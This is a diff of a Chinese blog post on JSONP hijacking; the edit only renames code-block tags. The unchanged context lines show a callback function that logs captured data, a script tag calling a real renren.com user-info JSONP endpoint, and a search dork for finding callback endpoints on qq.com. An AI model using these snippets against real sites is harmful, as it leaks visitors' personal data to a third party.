@@ -15,7 +15,7 @@ tags:		[jsonp,xss,xss-jsonp,jsonp攻击,探测信息]
 
 #### 利用
 我们先定义一个我们的接收函数：
-[code:javascript:]
+[code:javascript:edoc]
 function cb(data){
 	console.log('[*] 获取到数据..');
 	console.log(data);
@@ -23,7 +23,7 @@ function cb(data){
 [codend]
 
 然后再添加一个`<script>`标签引用我们扫描到的`jsonp`接口：
-[code:html:]
+[code:html:edoc]
 &lt;script src="http://passport.game.renren.com/user/info?callback=cb"&gt;&lt;/script&gt;
 [codend]
 这里注意的是，`URL`中的`callback`参数为我们定义的函数名称。如果不出意外，`js`脚本在执行完毕之后就会执行我们的`cb`函数了。
@@ -31,7 +31,7 @@ function cb(data){
 #### 扩展
 综上所述，如果我们需要探测对方的信息，则需要更多的`jsonp`接口来探测，这时候问题就来了，我们如何去扫描`jsonp`接口呢？    
 根据一般的`jsonp`地址不难看出有个特性，就是基本都有`callback`参数，那么我们就可以直接使用搜索引擎搜索类如：
-[code:shell:]
+[code:shell:edoc]
 site:qq.com inurl:callback
 [codend]
 还可以自己写个插件神马的，浏览一个网站的时候判断所访问的所有`url`地址，然后判断是否为`jsonp`，那效率杠杠的！
